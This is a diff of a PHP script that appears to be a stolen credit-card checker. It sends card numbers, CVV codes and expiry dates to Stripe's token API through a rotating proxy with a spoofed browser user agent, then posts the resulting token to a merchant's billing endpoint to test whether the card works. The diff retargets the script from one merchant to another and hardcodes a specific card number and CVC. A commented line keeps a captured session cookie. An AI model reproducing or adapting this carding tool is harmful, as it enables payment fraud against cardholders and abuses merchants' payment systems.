@@ -117,13 +117,13 @@ echo '[ IP: '.$ip.' ] ';
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
 curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
-curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
 curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
   'authority: api.stripe.com',
   'method: POST',
-  'path: /v1/payment_methods',
+  'path: /v1/tokens',
   'scheme: https',
   'accept: application/json',
   'accept-language: en-US,en;q=0.5',
@@ -144,7 +144,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [1req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=c8456f5f-5122-42a9-b245-6f3901c64c3057282b&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Faa9485558%3B+stripe-js-v3%2Faa9485558&time_on_page=83985&key=pk_live_NGJsMv0MLmtsBQknbpBwDYcE');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[number]=375150027363605&card[cvc]=1231&card[exp_month]=01&card[exp_year]=23&card[address_zip]=10080&guid=NA&muid=aa7d2a82-c320-425f-bad3-f514a5add6717e7932&sid=NA&payment_user_agent=stripe.js%2F00dd9dd68%3B+stripe-js-v3%2F00dd9dd68&time_on_page=219072&key=pk_live_51HfuVnDzZ23M3qAYO9DXTOjvdeuK2UkCEk2dGMhRsFyLXEVgA7KdmaHm5Meoq2IbXLwVw4RZI5KuKR9uZ9GPBbNO00n0HVmllP&pasted_fields=number');
 
 
 
@@ -156,7 +156,7 @@ $id = trim(strip_tags(getStr($result1,'"id": "','"')));
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
 curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
-curl_setopt($ch, CURLOPT_URL, 'https://criticalcss.com/api/premium/signup-payment');
+curl_setopt($ch, CURLOPT_URL, 'https://api.hostman.com/billing/card');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
@@ -167,15 +167,16 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
     curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'authority: criticalcss.com',
+'authority: api.hostman.com',
 'method: POST',
-'path: /api/premium/signup-payment',
+'path: /billing/card',
 'scheme: https',
-'accept: application/json',
+'accept: */*',
 'accept-language: en-US,en;q=0.5',
 //'Cookie: woocommerce_items_in_cart=1; wcf-visited-flow-2434=%5B2435%5D; __stripe_mid=dbd08490-b222-447e-92bd-9e58bf61e3a69a7b04; wordpress_logged_in_8c3e3ac310f0a2c0fe3b597f9cc5ddc5=makode2570%40dxecig.com%7C1615716214%7CRXxrFthEQYipRlO5HFaW0e9JwhDHlUW0OKG9BxNIlbK%7C38b941c8a641db31d05e31a3e6d354b41835bd4627a0ccb9c5007ca7266368ba; wp_woocommerce_session_8c3e3ac310f0a2c0fe3b597f9cc5ddc5=3118%7C%7C1614679328%7C%7C1614675728%7C%7C1594b10be1187832d57f24048b5863d6; cartflows_session_2434=2434_78b09801974667f835a5f2861c6cce5e; woocommerce_cart_hash=fcb3fce8ee65a822d9d94c10d42bc5c5; __stripe_sid=521698b5-14cd-4f0e-9a12-13fb221a4740333923',
-'content-type: application/json',
-'origin: https://criticalcss.com',
+'content-type: application/x-www-form-urlencoded; charset=UTF-8',
+'origin: https://dashboard.hostman.com',
+'referer: https://dashboard.hostman.com',
 'sec-fetch-dest: empty',
 'sec-fetch-mode: cors',
 'sec-fetch-site: same-site',
@@ -184,7 +185,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 ));
 # ----------------- [2req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS,'{"email":"'.$email.'","plan":"price_1HwBoaLYNoSq08J0Q92yIKGh","quantity":1,"customerId":null,"protect":"TP2WRyxFxcBYXCXcz@uTmKhs","paymentMethodId":"'.$id.'","sp":"null"}');
+curl_setopt($ch, CURLOPT_POSTFIELDS,'stripe=null&brand=null&number=3605&month=1&year=2023&funding=prepaid&token='.$token.'&vds=1&vds_config=24');
 
 
 $result2 = curl_exec($ch);
